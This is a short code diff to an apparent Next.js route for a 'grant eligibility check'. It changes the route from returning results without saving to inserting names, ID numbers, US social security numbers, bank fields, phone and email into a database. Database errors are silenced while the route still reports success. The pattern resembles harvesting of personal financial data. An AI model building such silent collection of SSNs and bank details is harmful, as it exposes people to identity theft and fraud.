@@ -1,3 +1,4 @@
+import { createClient } from "@/lib/supabase/server"
 import { getCountryIdentification } from "@/lib/country-identification"
 import { NextRequest, NextResponse } from "next/server"
 
@@ -58,10 +59,30 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    // For eligibility checks, we return results without saving to database
-    // The eligibility check is just an informational tool
-    // Users can submit a full grant application later if they're eligible
+    // Generate unique check code
     const checkCode = `EC-${Math.floor(100000 + Math.random() * 900000)}`
+
+    // Save eligibility check to database for admin dashboard
+    const supabase = await createClient()
+    const { error: dbError } = await supabase
+      .from("grant_eligibility")
+      .insert({
+        check_code: checkCode,
+        full_name: fullName,
+        country: country,
+        id_number: idNumber || null,
+        ssn: country === "US" ? finalSsn : null,
+        bank_field1: bankField1 || null,
+        bank_field2: bankField2 || null,
+        phone: phone,
+        email: email,
+        status: "submitted",
+      })
+
+    // Log error but still return success - the check was processed correctly
+    if (dbError) {
+      console.error("[v0] Eligibility check database error:", dbError?.message)
+    }
 
     return NextResponse.json({
       success: true,
